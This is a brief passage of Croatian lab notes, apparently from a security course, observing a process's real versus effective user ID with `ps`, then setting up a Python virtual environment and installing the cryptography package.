- Izvršavanjem naredbe `ps -eo pid,ruid,euid,suid,cmd` u drugom terminalu dobili smo uvid u sve tekuće procese. Vidjeli smo da je RUID odgovara Bob-ovom dok je EUID onaj od *super user-a*.

🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐

### Kreiranje Python okoline

```bash
$ mkdir juric_marino
$ cd juric_marino
$ python -m venv juric_marino
$ cd juric_marino
$ cd Scripts
$ activate
$ cd ..
$ pip install cryptography
$ code .
```